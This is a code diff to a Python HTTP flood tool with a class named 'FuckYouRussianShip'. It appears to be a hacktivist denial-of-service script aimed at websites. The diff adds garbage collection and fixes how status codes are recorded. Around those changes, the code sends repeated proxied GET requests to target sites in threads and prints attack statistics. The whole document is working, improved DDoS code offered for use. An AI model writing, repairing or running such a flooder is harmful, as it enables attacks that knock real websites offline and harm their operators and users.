@@ -22,6 +22,11 @@ from urllib3 import disable_warnings
 import subprocess
 from shutil import which
 
+#Garbage collector
+import requests
+import gc
+#from pympler.tracker import SummaryTracker
+
 statistic = {}
 work_statistic = True
 general_statistics = [0, 0]
@@ -39,6 +44,7 @@ class FuckYouRussianShip:
     }
 
     def __init__(self):
+        gc.enable()
         disable_warnings()
         parser = self.create_parser()
         self.args, self.unknown = parser.parse_known_args()
@@ -62,6 +68,7 @@ class FuckYouRussianShip:
 
     @staticmethod
     def clear():
+        gc.collect()
         if platform.system() == "Linux":
             return system('clear')
         else:
@@ -179,16 +186,18 @@ class FuckYouRussianShip:
                         scraper.proxies.update(
                             {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                         response = scraper.get(site)
-                        self.write_statistic_success(site, attack.status_code)
+                        self.write_statistic_success(site, response.status_code)
 
                         if response.status_code >= 200 and response.status_code <= 302:
                             for i in range(self.MAX_REQUESTS):
                                 response = scraper.get(site, timeout=10)
-                                self.write_statistic_success(site, attack.status_code)
+                                self.write_statistic_success(site, response.status_code)
+                                del response
                 else:
                     for i in range(self.MAX_REQUESTS):
                         response = scraper.get(site, timeout=10)
-                        self.write_statistic_success(site, attack.status_code)
+                        self.write_statistic_success(site, response.status_code)
+                        del response
             except ConnectionError as exc:
                 self.write_statistic_error(site)
                 continue
@@ -197,6 +206,8 @@ class FuckYouRussianShip:
                 continue
             finally:
                 threads_count -= 1
+                del attack
+                gc.collect()
                 return self.mainth()
 
     @staticmethod
@@ -221,6 +232,7 @@ class FuckYouRussianShip:
     @staticmethod
     def print_statistic():
         FuckYouRussianShip.clear()
+        #tracker = SummaryTracker()
         while True:
             if len(statistic.keys()):
                 print(f"Attack in processing... Success: {general_statistics[0]} | Errors: {general_statistics[1]}")
@@ -243,7 +255,8 @@ class FuckYouRussianShip:
                 ])
                 tp.table(data=statistic_data,
                          headers=headers,
-                         width=[len(max(list(statistic.keys()), key=len)), 10, 10, 10, 10, 10, 8])
+                         width=[len(max(list(statistic.keys()), key=len)), 10, 10, 10, 10, 10, 8])            
+            #tracker.print_diff()
             sleep(5)
             FuckYouRussianShip.clear()
 
@@ -266,6 +279,8 @@ def attacker_threading(threads_count, worker_func):
             while True:
                 try:
                     status, site = task.result()
+                    del status
+                    del site
                     break
                 except BaseException:
                     sleep(5)
